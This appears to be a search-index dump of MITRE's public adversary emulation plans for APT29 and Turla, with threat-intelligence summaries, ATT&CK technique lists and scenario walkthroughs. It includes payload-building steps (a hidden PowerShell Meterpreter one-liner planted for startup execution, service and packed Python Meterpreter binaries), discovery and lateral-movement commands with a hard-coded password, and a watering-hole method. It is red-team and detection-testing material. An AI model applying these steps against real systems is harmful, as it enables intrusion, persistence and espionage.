https://github.com/peewpw/Invoke-PSImage):"]},{"i":"3-startup-folder-payload-strings64hostuiexe","l":"3. Startup Folder Payload (strings64/hostui.exe)","p":["Filename","Location","Description","strings64.exe","payloads/SysinternalsSuite/strings64.exe","Launches Meterpreter using CreateProcessWithToken API call","Generate PowerShell-formatted Meterpreter:","Copy the PowerShell 1-liner to clipboard. Your clipboard should look like:","powershell.exe -nop -w hidden -e aQBmAc...base64 string...KAOwa=","Do not copy the execution preamble (%COMSPEC% /b /c start /b /min)","Open payloads/readme.txt; paste the PowerShell-Meterpreter blog on line 816. This line should look like:","$javasvc = powershell.exe -nop -w hidden -e aQBmAc...base64 string...KAOwa="]},{"i":"4-persistent-service-payload-javamtsupexe","l":"4. Persistent Service Payload (javamtsup.exe)","p":["Filename","Location","Description","javamtsup.exe","payloads/SysinternalsSuite/javamtsup.exe","Reverse HTTPS Meterpreter service executable","Generate a Meterpreter service-binary:"]},{"i":"5-seaduke-payload-pythonexe","l":"5. SeaDuke Payload (python.exe)","p":["Filename","Location","Description","python.exe","payloads/Seaduke/python.exe","Python Meterpreter compiled to EXE with PyInstaller","Generate python-formatted Meterpreter:","Transfer python.py to Windows attack platform","Compile python.py into a portable executable using PyInstaller ( https://pypi.org/project/PyInstaller/)","Pack the python.exe payload using UPX ( https://github.com/upx/upx)"]}],[{"l":"APT29 Intelligence Summary"},{"i":"attck-group-id-g0016","l":"ATT&CK Group ID: G0016"},{"i":"associated-groups-yttrium-the-dukes-cozy-bear-cozyduke","l":"Associated Groups: YTTRIUM, The Dukes, Cozy Bear, CozyDuke","p":["Objectives: APT29 is thought to be an organized and well-resourced cyber threat actor whose collection objectives align with the interests of the Russian Federation. 1, 14 The group is reported to have been operating as early as 2008 and may have logged operational successes as recently as 2020. APT29's objective over time and across a diverse target set appears to have been the exfiltration of information that could be used to inform strategic decision making. 1","Target Industries: APT29 operations have been directed against government agencies, embassies, political parties, defense contractors, non-governmental organizations, law enforcement, media, pharmaceutical companies, and think tanks. Geographically, APT29 has aggressed targets in the United States, Germany, Uzbekistan, South Korea, Turkey, Uganda, Poland, Chechnya, Georgia, Kazakhstan, Kyrgyzstan, Azerbaijan, Uzbekistan, Czech Republic, Belgium, Portugal, Romania, Ireland, and Hungary. 1, 8, 11, 12, 15, 16","Operations: In terms of operational tradecraft, APT29 is distinguished by their commitment to stealth and use of sophisticated techniques. APT29 is reported to have exploited zero-day vulnerabilities and has pursued actions on the objective using suites of custom malware, coupled with alternate execution methods such as PowerShell and WMI. APT29 has also been known to employ various operational cadences (smash-and-grab vs. slow-and-deliberate) depending on the target's perceived intelligence value. 1","APT29 is reported to have attained initial access by exploiting public-facing applications ( T1190), phishing ( T1566.001, T1566.002), and supply chain compromise ( T1195). The group is reported to have implemented at least two operational cadences, smash-and-grab and slow-and-deliberate. Different suites of tools and TTPs were employed for each one of these cadences. If a target was determined to be of value, the attackers are reported to have modified TTPs, and deployed a stealthier toolset with the intent or establishing long-term persistent access. 1","The objective of smash-and-grab operations appears to have been rapid collection and exfiltration. 1 As such, soon after achieving an initial foothold, APT29 actors are reported to have performed host-based situational awareness checks, and immediately sought to collect and exfiltrate data. If the host was determined to be of value, a stealth toolkit was deployed and persisted. The attackers are reported to have moved through the network, exfiltrating data and persisting on hosts deemed to be valuable. 1","In their smaller more targeted campaigns, APT29 has utilized a different toolset incrementally modified to attempt to evade published intelligence about their operations. 1"]},{"i":"apt29-attck-navigator","l":"APT29 ATT&CK Navigator"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-attributed-to-apt29-as-referenced-by-mitre-attck","l":"The following behaviors are in scope for an emulation of actions attributed to APT29 as referenced by MITRE ATT&CK.","p":["/Attack_Layers/APT29_Scenario1.png"]},{"l":"Scenario 1"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-attributed-to-apt29-as-implemented-in-scenario-1-in-the-referenced-reporting","l":"The following behaviors are in scope for an emulation of actions attributed to APT29, as implemented in Scenario 1, in the referenced reporting.","p":["/Attack_Layers/APT29_Scenario1.png"]},{"l":"Scenario 2"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-attributed-to-apt29-as-implemented-in-scenario-2-in-the-referenced-reporting","l":"The following behaviors are in scope for an emulation of actions attributed to APT29, as implemented in Scenario 2, in the referenced reporting.","p":["/Attack_Layers/APT29_Scenario2.png"]},{"l":"CosmicDuke"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-apt29-using-cosmicduke-exclusively-based-on-current-intelligence-within-attck-for-the-given-software","l":"The following behaviors are in scope for an emulation of actions performed by APT29 using CosmicDuke, exclusively based on current intelligence within ATT&CK for the given software.","p":["/Attack_Layers/CosmicDuke_S0050.png"]},{"l":"MiniDuke"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-apt29-using-miniduke-exclusively-based-on-current-intelligence-within-attck-for-the-given-software","l":"The following behaviors are in scope for an emulation of actions performed by APT29 using MiniDuke, exclusively based on current intelligence within ATT&CK for the given software.","p":["/Attack_Layers/MiniDuke_S0051.png"]},{"l":"SeaDuke"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-apt29-using-seaduke-exclusively-based-on-current-intelligence-within-attck-for-the-given-software","l":"The following behaviors are in scope for an emulation of actions performed by APT29 using SeaDuke, exclusively based on current intelligence within ATT&CK for the given software.","p":["/Attack_Layers/SeaDuke_S0053.png"]},{"l":"CozyCar"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-apt29-using-cozycar-exclusively-based-on-current-intelligence-within-attck-for-the-given-software","l":"The following behaviors are in scope for an emulation of actions performed by APT29 using CozyCar, exclusively based on current intelligence within ATT&CK for the given software.","p":["/Attack_Layers/CozyCar_S0046.png"]},{"l":"HammerToss"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-apt29-using-hammertoss-exclusively-based-on-current-intelligence-within-attck-for-the-given-software","l":"The following behaviors are in scope for an emulation of actions performed by APT29 using HammerToss, exclusively based on current intelligence within ATT&CK for the given software.","p":["/Attack_Layers/HAMMERTOSS_S0037.png"]},{"l":"PowerDuke"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-apt29-using-powerduke-exclusively-based-on-current-intelligence-within-attck-for-the-given-software","l":"The following behaviors are in scope for an emulation of actions performed by APT29 using PowerDuke, exclusively based on current intelligence within ATT&CK for the given software.","p":["/Attack_Layers/HAMMERTOSS_S0037.png"]},{"l":"POSHSPY"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-apt29-using-poshspy-exclusively-based-on-current-intelligence-within-attck-for-the-given-software","l":"The following behaviors are in scope for an emulation of actions performed by APT29 using POSHSPY, exclusively based on current intelligence within ATT&CK for the given software.","p":["/Attack_Layers/HAMMERTOSS_S0037.png"]},{"l":"CloudDuke"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-apt29-using-cloudduke-exclusively-based-on-current-intelligence-within-attck-for-the-given-software","l":"The following behaviors are in scope for an emulation of actions performed by APT29 using CloudDuke, exclusively based on current intelligence within ATT&CK for the given software.","p":["/Attack_Layers/HAMMERTOSS_S0037.png"]},{"l":"Software","p":["A Cobalt Strike beacon was used in a suspected APT29 phishing campaign. 8","APT29 appears to have used SeaDuke as a secondary backdoor and to target both Windows and Linux systems. 1","APT29 has delivered PowerDuke through malicious document macros.","APT29 has used CloudDuke as a backdoor to execute remote commands. 1","APT29 has used CosmicDuke to perform information gathering and data exfiltration. 1","APT29 has used CozyDuke to download Mimikatz, along with script files to execute Mimikatz. 1","APT29 has used CozyDuke to download PsExec, along with script files to execute PsExec. 1","APT29 has used GeminiDuke to collect victim computer configuration information. 1","APT29 has used HammerDuke to leave persistent backdoors on compromised networks. C2 communication has occurred over HTTP(S) as well as through Twitter. 1","APT29 has used MiniDuke as a backdoor to remotely execute commands on compromised systems. 1","APT29 has used OnionDuke to steal credentials, gather information, and perform denial of service attacks. 1","APT29 has used PinchDuke to steal information such as system configuration information, user credentials, and user files. 1","APT29 has used POSHSPY as a secondary backdoor that uses PowerShell and Windows Management Instrumentation.","APT29 has used SDelete to attempt to cover their tracks. 5","APT29 has used spear-phishing to infect victims with CozyCar and has used it to gather initial information on victims to determine which ones to continue pursuing further with a different tool. 1","APT29 has used the Meek plugin for Tor to hide traffic. 5","APT29 has used TOR to hide their remote access. 5","Associated Names","Availability","Backdoor","Backdoor, Downloader","CloudDuke ( S0054)","Cobalt Strike ( S0154)","Commercial","CosmicDuke ( S0050)","CozyCar ( S0046)","CozyDuke, CozyBear, Cozer, EuroAPT","Downloader, Loader, Backdoor","Emulation Notes","GeminiDuke ( S0049)","HammerDuke, NetDuke","HAMMERTOSS ( S0037)","Information Stealear","Information Stealer","Malware Toolset","meek ( S0175)","Mimikatz ( S0002)","MiniDionis, CloudLook","MiniDuke ( S0051)","Modular Malware Platform","Name","OnionDuke ( S0052)","Openly Available","PinchDuke ( S0048)","POSHSPY ( S0150)","PowerDuke ( S0139)","Proxy Tool","PsExec ( S0029)","Remote Execution","SDelete ( S0195)","SeaDaddy, SeaDesk","SeaDuke ( S0053)","Secure Delete Application","Software Type","Threat Emulation Software","TinyBaron, BotgenStudios, NemesisGemina","Tor ( S0183)","Tor Plugin","Windows Credential Dumper"]},{"l":"References","p":["\"Forkmeiamfamous\": Seaduke, latest weapon in the Duke armory","1","10","11","12","13","14","15","16","2","3","4","5","6","7","8","9","Analysis of cyberattack on U.S. think tanks, non-profits, public sector by unidentified attackers","April 2015","April 2017","CISA/ FBI","COSMICDUKE: Cosmu with a twist of MiniDuke","CrowdStrike","Crowdstrike's work with the Democratic National Committee: Setting the record straight","Date","December 2016","December 2018","DerbyCon: No Easy Breach","Dissecting One of APT29’s Fileless WMI and PowerShell Backdoors (POSHSPY)","F-Secure","February 2013","FireEye","GRIZZLY STEPPE - Russian Malicious Cyber Activity","HAMMERTOSS: Stealthy Tactics Define a Russian Cyber Threat Group","ID","January 2015","January 2019","July 2014","July 2015","June 2016","Kaspersky","Microsoft","Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign","November 2016","November 2018","Palo Alto","PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs","Publisher","SentinelOne","September 2016","September 2017","Source","State of the Hack S2E01: #NoEasyBreach REVISITED","Symantec","The CozyDuke APT","The Dukes: 7 Years of Russian Cyberespionage","The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor","This Intelligence Summary summarizes 16 publicly available sources, as well as the results of an open call for contributions. The following organizations participated in the community cyber threat intelligence contribution process:","Unit 42 Technical Analysis: Seaduke","VirusTotal","VirusTotal Submission 2f39dee2ee608e39917cc022d9aae399959e967a2dd70d83b81785a98bd9ed36","Volexity"]},{"l":"Additional Plan Resources","p":["Intelligence Summary","Operations Flow","Emulation Plan","Scenario 1 - Infrastructure","Scenario 1","Scenario 2 - Infrastructure","Scenario 2","YAML","Archive","Issues","Change Log"]}],[{"l":"APT29 Operations Flow","p":["Please see the formal APT29 Intelligence Summary which includes a break-down of the cited intelligence used for each step of this emulation.","/Emulation_Plan/OpFlow_Diagram.png"]},{"l":"Scenario 1","p":["Based on CosmicDuke, MiniDuke, SeaDuke/SeaDaddy, CozyDuke/CozyCar, and HAMMERTOSS","This scenario begins with a legitimate user clicking on a malicious payload delivered via a \"spray and pray\" spearphishing campaign. The attacker immediately kicks off a \"smash-and-grab\", rapid espionage mission, gathering and exfiltrating data. After initial exfiltration, the attacker realizes the value of the victim and subsequently deploys a stealthier toolkit, changing TTPs and eventually moving laterally through the rest of the environment. The scenario ends with the execution of previously established persistence mechanisms.","The content to execute this scenario was tested and developed using Pupy, Meterpreter, and other custom/modified scripts and payloads. Pupy and Meterpreter were chosen based on their available functionality and similarities to the adversary's malware within the context of this scenario, but alternative red team tooling could be used to accurately execute these and other APT29 behaviors."]},{"l":"Scenario 2","p":["Based on PowerDuke, POSHSPY, CloudDuke, and more recent (2016-2018) TTPs","This scenario begins with a legitimate user clicking on a malicious payload delivered via a targeted spearphishing campaign. The attacker employs a methodical approach to compromising the initial target, establishing persistence, gathering credential material, then finally enumerating and compromising the entire domain. Data is exfiltrated to attacker controlled cloud storage. The scenario ends with a simulated time-lapse where previously established persistence mechanisms are executed.","The content to execute this scenario was tested and developed using PoshC2 and other custom/modified scripts and payloads. PoshC2 was chosen based on its available functionality and similarities to the adversary's malware within the context of this scenario, but alternative red team tooling could be used to accurately execute these and other APT29 behaviors."]},{"l":"Additional Plan Resources","p":["Intelligence Summary","Operations Flow","Emulation Plan","Scenario 1 - Infrastructure","Scenario 1","Scenario 2 - Infrastructure","Scenario 2","YAML","Archive","Issues","Change Log"]}],[{"l":"Change Log"},{"l":"APT29 Emulation Plan","p":["Version","Date","Change Details","0.1","21 April 2020","ATT&CK Evaluations Release","1.0","21 January 2021","Adversary Emulation Library Release"]}],[{"l":"Turla","p":["License","Based on open-source intelligence, the MITRE ATT&CK ® Evaluations team created the below scenario leveraging techniques seen from Turla in the wild. We have adapted the scenario based on tools and resources available at the time."]},{"i":"adversary-overview","l":"Adversary Overview ♾️\uD83E\uDEA8\uD83E\uDDF8","p":["Active since at least the early 2000s, Turla is a sophisticated Russian-based threat group that has infected victims in more than 50 countries. 1 The group has targeted government agencies, diplomatic missions, military groups, research and education facilities, critical infrastructure sectors, and media organizations. 1 2 Turla leverages novel techniques and custom tooling and open-source tools to elude defenses and persist on target networks. 3 4 The group is also known for its adaptability and willingness to evolve behaviors and tools to achieve campaign objectives. 5 6 7 Turla is known for their targeted intrusions and innovative stealth. After establishing a foothold and conducting victim enumeration, Turla persists with a minimal footprint through in-memory or kernel implants. 8 9 Turla executes highly targeted campaigns aimed at exfiltrating sensitive information from Linux and Windows infrastructure. 10 11","Associated Groups: IRON HUNTER, Group 88, Belugasturgeon, Waterbug, WhiteBear, Snake, Krypton, Venomous Bear"]},{"i":"emulation-overview","l":"Emulation Overview \uD83D\uDCD6","p":["This scenario follows Turla’s multi-phase intelligence collection campaign by establishing a typo-squatted website of NATO to target entities with a high value of information. During phase one, Turla implants a watering hole for persistence on the victim’s network as a way to compromise more targets of interest. Turla gains initial access through a spearphishing email, a fake software installer is downloaded onto the victim machine, and execution of the EPIC payload takes place. Once persistence and C2 communications are established, a domain controller is discovered, and CARBON-DLL is ingressed into victim network. Further lateral movement brings the attackers to a Linux Apache server where PENGUIN is copied to the server and used to install a watering hole.","In phase two of the attack, the attackers establish a typo-squatted website to target entities with high value information. The victims are prompted to update their (Not)Flash, and in doing so, EPIC is installed on their network. EPIC communicates to the C2 server via proxy web server with HTTPS requests, and SNAKE is then deployed to maintain foothold, elevate privileges and communicates to the C2 via HTTP/SMTP/DNS. Next, the attackers move laterally onto a Microsoft IIS server, install SNAKE, and create an admin account. The attackers then move laterally onto an Exchange workstation, and install SNAKE. Fianlly, they move laterally onto an Exchange Server and install LightNeuron. LIGHTNERON enables email collection and staging for exfiltrating stolen data via benign email PDF/JPG attachments. Turla proceeeds to collect and exfiltrate sensitive communications in an effort to identify new information sources and collect up-to-date information relevant to mission objectives.","Carbon Operations Flow Diagram Snake Operations Flow Diagram"]},{"l":"Quick Links"},{"i":"for-engineers","l":"For Engineers \uD83E\uDDD1‍\uD83D\uDCBB"},{"l":"Resources","p":["The Resources Folder contains the emulated software source code.","The Binaries.zip contains scenario payloads in one zip file for easy download. The password is malware.","NOTE: The Snake installer has not been included in this zip and must be recompiled.","All other pre-built executables have been removed. To rebuild the binaries, follow the documentation for the respective binary.","This scenario also utilizes Mimikatz, Plink, Pscp, and PsExec as payloads:","mimikatz","plink.exe","pscp.exe","PsExec"]},{"l":"YARA Rules","p":["YARA rules are provided to assist the community in researching, preventing, and detecting malware specimens used in this emulation plan."]},{"i":"emulation-key-software","l":"Emulation Key Software \uD83D\uDCBB","p":["EPIC","Carbon","Keylogger","Penquin","Snake","LightNeuron"]},{"l":"Scenario Walkthrough","p":["Carbon Detection Scenario- Step by step walkthrough of Carbon Detection Scenario's procedures (10 steps)","Snake Detection Scenario- Step by step walkthrough of Snake Scenario's procedures (9 steps)","Carbon Protection Scenario- Step by step walkthrough of Carbon Protection Scenario's procedures (7 tests)","Snake Protection Scenario- Step by step walkthrough of Snake Protection Scenario's procedures (6 tests)"]},{"i":"for-analysts","l":"For Analysts \uD83D\uDD0E","p":["Carbon Operation Flow- High-level summary of the Carbon scenario & infrastructure with diagrams.","Snake Operation Flow- High-level summary of the Snake scenario & infrastructure with diagrams.","Intelligence Summary- General overview of the Adversary with links to reporting used throughout the scenario."]},{"l":"Acknowledgements","p":["We would like to formally thank the people that contributed to the content, review, and format of this document. This includes the MITRE ATT&CK and MITRE ATT&CK Evaluations teams, the organizations and people that provided public intelligence and resources, as well as the following organizations that participated in the community cyber threat intelligence contribution process: - Microsoft - CrowdStrike"]},{"i":"connect-with-us","l":"Connect with us \uD83D\uDDE8️","p":["We \uD83D\uDC96 feedback! Let us know how using ATT&CK Evaluation results has helped you and what we can do better.","Email: evals@mitre-engenuity.org Twitter: https://twitter.com/MITREengenuity LinkedIn: https://www.linkedin.com/company/mitre-engenuity/"]},{"i":"liability--responsible-usage","l":"Liability / Responsible Usage","p":["This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research."]},{"l":"Notice","p":["© 2023 MITRE Engenuity. Approved for Public Release. Document number CT0005.","Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at","http://www.apache.org/licenses/LICENSE-2.0","Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.","This project makes use of ATT&CK®","ATT&CK Terms of Use"]}],[{"i":"#","p":["Based on open-source intelligence, the ATT&CK ® Evaluations team created the below scenario leveraging techniques seen from Turla in the wild. We have adapted the scenario based on tools and resources available at the time. Below is a scenario overview, step-by-step breakdown, and an infrastructure diagram."]},{"i":"carbon-emulation-scenario","l":"Carbon Emulation Scenario \uD83D\uDCD6","p":["This scenario follows Turla’s multi-phase approach to implant a watering hole as a way to compromise more victims of interest. Turla gains initial access through a spearphishing email, a fake software installer is downloaded onto the victim machine and execution of the EPIC payload takes place. Once persistence and C2 communications are established, a domain controller is discovered, and CARBON-DLL is ingress into victim network. Further lateral movement takes the attackers to a Linux Apache server, PENGUIN is copied to the server and used to install a watering hole.","Phase 1: The scenario begins when the user Gunter visiting a typosquat domain via a spearphishing email. When the link is opened, a fake software installer is downloaded on Gunter’s Windows host machine. Gunter clicks “Install,” executing the malicious EPIC payload. EPIC establishes persistence and connects to a C2 server via a proxy web server using HTTP requests. The attacker’s enumeration on Gunter’s device, discovers a domain controller on the network and the domain admin Frieda.","Phase 2: To maintain persistence, the attackers will deploy CARBON-DLL and prepare to laterally move onto the domain controller. The use of password spraying helps to obtain Frieda’s domain admin credentials. Frieda’s credentials are then used to mount the DC’s hard drive, move a copy of CARBON-DLL to this drive, and execute the malware on the DC via remote scheduled task. A Linux Apache Server and the server’s admin Adalwolfa is discovered during enumeration. CARBON-DLL downloads Mimikatz and dumps Adalwolfa’s stored NTLM hash. Mimikatz and Adalwolfa’s NTLM hash are used to perform a pass-the-hash (PtH) attack allowing the attackers to authenticate into Adalwolfa’s device and copy CARBON-DLL to the workstation via PsExec.","Phase 3: On Adalwolfa’s workstation, a custom keylogger is dropped and captures plaintext SSH credentials. CARBON-DLL downloads the PENQUIN malware to Adalwolfa’s workstation, the SSH credentials allows the attackers to copy PENQUIN to the Apache server and execute the malware via plink. PENQUIN is utilized to install a watering hole causing users browsing a legitimate HTML site to be redirected to the malicious, attacker-controlled site.","Carbon Operations Flow Diagram","Carbon Software Flow Diagram"]},{"i":"scenario-steps","l":"Scenario Steps\uD83D\uDC63","p":["About PENQUINx64: the malware can also download remote files in chunks (1024 bytes each) to a local vile via the “do_vsdownload” function. This particular method will not work for the scenario since all “do_vs” functions are executed on remote IPs distinct from the C2 (a.k.a. a third peer). CTI deviation: Based on available reporting, PENQUINx64 has not been used in watering hole attacks. However, Turla has used other tools/payloads to launch watering hole attacks to fingerprint victims for initial access purposes. This scenario uses the installation of watering holes to transition into the SNAKE scenario (second scenario). Watering hole details: 1. User visits the compromised webpage hosting malicious Javascript. 2. On the user’s first visit, the browser adds and evercookie which has an MD5 value provided by the web server. The evercookie will keep track of which users have already visited the site. 3. On a user’s second visit, the stored MD5 value is used to identify the victim and the attackers will collect OS info which is sent to the C2 through POST requests.","After obtaining the NTLM hash for user Adalwolfa, the attackers will move laterally to this user’s workstation. In order to do this, the threat actor will leverage the CARBON-DLL implant on the domain controller to download PsExec and another copy of the CARBON-DLL installer. To perform the lateral movement, CARBON-DLL performs a pass-the-hash (PtH) attack to move the installer onto Adalwolfa’s device. Finally, the attackers use PsExec to execute CARBON-DLL remotely on Adalwolfa’s Windows workstation.","Analyst Notes","C2 Comms Details: Internal: P2P, use of named pipes, worker drones received tasks via named pipes External: use of HTTP requests, communication drones contacted C2s directly","CARBON-DLL","CARBON-DLL Keylogger: winsvcxgt.exe","CARBON-DLL Mimikatz","CARBON: ipconfig -all netstat -r netstat -an nbtstat -n nbtstat -s net share net file net session net use net group net view net config system info net time \\\\127.0.0.1","Commands","CTI deviation: SSH was not utilized in Turla’s PENQUINx64 campaign, but has been used in other Turla attacks PENQUINx64 variant: - Written in C/C++- 64-bit architectures - Defense evasion: embeds legitimate Linux binary to mimic cron Old versions of PENQUIN:- ELF 32-bit LSB exe - Intel 80386 version 1 (SYSV) - GNU/Linux 2.2.5 (stripped) - Does not require admin/root privileges to run - Requires 2 parameters: ID & existing network interface name Essentially, there are commands that are integrated into PENQUINx64’s code. Each command code corresponds to a specific function which the malware then executes. A full list of these functions is listed on page 13 of the Leonardo Spa report.","CTI deviation: we simplified the delivery of EPIC for feasibility purposes. According to CTI, Turla previously delivered EPIC using Adobe exploits (CVE-2013-3346 & CVE-2013-5065) or watering hole attacks.","EPIC","EPIC discovery commands: arp -a net use ipconfig/all net localgroup administrators net group Doman Admins /domain net group Domain Computers /domain net group Domain Controllers /domain tasklist /svc reg query","EPIC will terminate itself upon discovering any of the following processes: tcpdump.exe windump.exe ethereal.exe wireshark.exe ettercap.exe snoop.exe dsniff.exe","EPIC will then be injected via DLL onto Gunter’s workstation. The implant will perform initial discovery commands, enumerating information about the user, host device, network, system, registry, directory, and running processes. EPIC will send this data to the C2 via a proxy web server using HTTP requests. This web server, which was initially used to download the Adobe Flash installer, hosts a fake WordPress-related domain.","https://securelist.com/the-epic-turla-operation/65545/ https://blog.talosintelligence.com/2021/09/tinyturla.html https://www.leonardo.com/documents/15646808/16757471/Malware+Technical+Insight+_ Turla+%E2%80%9CPenquin_x64%E2%80%9D.pdf/524e39d0-029f-1a99-08d5-c013be1b8717?t=1590739252338 https://securelist.com/the-penquin-turla-2/67962/","https://securelist.com/the-epic-turla-operation/65545/ https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=4501a782-fd84-4f44-a231-ee2a3e838c39&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments","https://securelist.com/the-epic-turla-operation/65545/ https://go.recordedfuture.com/hubfs/reports/cta-2020-0312.pdf https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://securelist.com/the-epic-turla-operation/65545/ https://go.recordedfuture.com/hubfs/reports/cta-2020-0312.pdf https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Visiting-The-Snake-Nest.pdf","https://securelist.com/the-epic-turla-operation/65545/ https://www.leonardo.com/documents/15646808/16757471/Malware+Technical+Insight+_ Turla+%E2%80%9CPenquin_x64%E2%80%9D.pdf/524e39d0-029f-1a99-08d5-c013be1b8717?t=1590739252338 https://securelist.com/the-penquin-turla-2/67962/ https://lab52.io/blog/looking-for-penquins-in-the-wild/ https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/ https://github.com/samyk/evercookie|","https://securelist.com/the-epic-turla-operation/65545/ https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html https://blog.talosintelligence.com/2021/09/tinyturla.html","https://securelist.com/the-epic-turla-operation/65545/ https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/ https://www.accenture.com/us-en/blogs/cyber-defense/turla-belugasturgeon-compromises-government-entity https://www.gdatasoftware.com/blog/2015/01/23926-analysis-of-project-cobra","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html (pp. 21) https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/waterbug-espionage-governments","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html(pp. 21) https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/waterbug-espionage-governments https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/","In order to maintain a foothold on the Apache web server, the adversary will utilize PENQUIN to install a watering hole. Specifically, the attackers send a magic packet to the Apache server, which is read by PENQUIN. This causes the creation of a reverse shell, which will perform discovery commands. Then, the attackers append additional script tags to a webpage previously accessed by Adalwolfa on the Apache server. This will allow users browsing the legitimate site http://kagarov/index[.]html to be redirected to the malicious, attacker-controlled site anto-int[.]com.","Mimikatz PsExec","net use EPIC has moved through the victim’s network using pre-defined passwords: net use \\\\NET-DC-01\\C$ P@ssw0rd /user:MOFA\\Administrator","Next, the attackers download Mimikatz ( mmgaproxy.exe) to the DC and the attackers retrieve NTLM hash for admin user Adalwolfa.","Next, the attackers will deploy CARBON-DLL as a second-stage malware onto Gunter’s workstation in order to maintain persistence. CARBON-DLL, a variant of CARBON relying on DLLs and asymmetric encryption, will establish C2 communications via a redirector using HTTP requests. Once this communication channel is created, the malware will run a few discovery commands on Gunter’s device and drop several files to disk. CARBON-DLL has the following components and functions: Installer- create subdirectories for staging, create services, and executes loader Loader- written to a registry key path, runs under svchost and executes orchestrator Orchestrator- injects communications library DLL into processes via HTTP","Once C2 communications have been established between EPIC and the C2 via the proxy web server, the attackers will collect information about the host device, including: -Local/privileged groups -System services -System/Process discovery At this point, the adversary will discover 2 crucial aspects on the network: -Domain controller -Domain admin accounts, including user Frieda In order to escalate privileges, EPIC restarts itself as local system admin on Gunter’s workstation.","Once the adversary has moved onto Adalwolfa’s computer, CARBON-DLL downloads a custom keylogger ( winsvcxgt.exe). This tool allows the adversary to retrieve Adalwolfa’s plaintext SSH credentials during the user’s Chrome browser session.","Password spraying: CTI shows that EPIC has been used to conduct password spraying (see Report 1 for details)","PENQUINx64","PENQUINx64 plink","Reporting","Software","Step 1 Initial Compromise T1566.002: Phishing: Spearphishing Link T1204.002: User Execution: Malicious File T1036.004: Masquerading: Masquerade Task or Service T1574.007: Hijack Execution Flow: Path Interception by Path Environment Variable T1547.004: Boot Logon Autostart Execution: Winlogon Helper DLL","Step 10 Installation of Watering Hole T1205: Traffic Signaling T1132.001: Data Encoding: Standard Encoding T1059.004: Command and Scripting Interpreter: Unix Shell T1033: System Owner/User Discovery T1083: File and Directory Discovery T1189: Drive-by Compromise","Step 2 Establish Initial Access T1027: Files or Information T1055.007: Injection: Dynamic-link Library Injection T1057: Discovery T1059.003: and Scripting Interpreter: Windows Command Shell T1087.001: Account Discovery: Local Account T1012: Query Registry T1082: Information Discovery T1124: System Time Discovery T1057: Process Discovery T1135: Network Share Discovery T1049: System Network Connections Discovery T1069.001: Permission Groups Discovery: Local Groups T1033: System Owner/User Discovery T1083: File and Directory Discovery T1560.002: Archive Collected Data: Archive via Library T1132.001: Data Encoding: Standard Encoding T1071.001: Application Layer Protocol: Web Protocols T1090.002: Proxy: External Proxy","Step 3 Discovery & Privilege Escalation T1033: System Owner/User Discovery T1007: System Service Discovery T1124: System Time Discovery T1049: System Network Connections Discovery T1135: Network Share Discovery T1016: System Network Configuration Discovery T1069.001: Permission Groups Discovery: Local Groups T1069.002: Permission Groups Discovery: Domain Groups T1012: Query Registry T1059.001: Command and Scripting Interpreter: PowerShell T1574.011: Hijack Execution Flow: Services Registry Permissions Weakness","Step 4 Persistence T1105: Ingress Tool Transfer T1543.003: Create or Modify System Process: Windows Service T1112: Modify Registry T1569.002: System Services: Service Execution T1036.004: Masquerade Task or Service T1055.007: Injection: Dynamic-link Library Injection T1033: System Owner/User Discovery T1049: System Network Connections Discovery T1071.001: Application Layer Protocol: Web Protocols T1573.002: Encrypted Channel: Asymmetric Cryptography T1573.001: Encrypted Channel: Symmetric Cryptography T1132.001: Data Encoding: Standard Encoding T1074.001: Data Staged: Local Data Staging","Step 5 Lateral Movement to Domain Controller T1105: Ingress Tool Transfer T1059.003: Command and Scripting Interpreter: Windows Command Shell T1110.003: Brute Force: Password Spraying T1021.002: Remote Services: SMB/Windows Admin Shares T1070.004: Indicator Removal on Host: File Deletion T1570: Lateral Tool Transfer T1053.005: Scheduled Task/Job: Scheduled Task T1071: Application Layer Protocol T1069.002: Permission Groups Discovery: Domain Groups T1018: Remote System Discovery","Step 6 Preparation for Lateral Movement onto Second Host T1105: Ingress 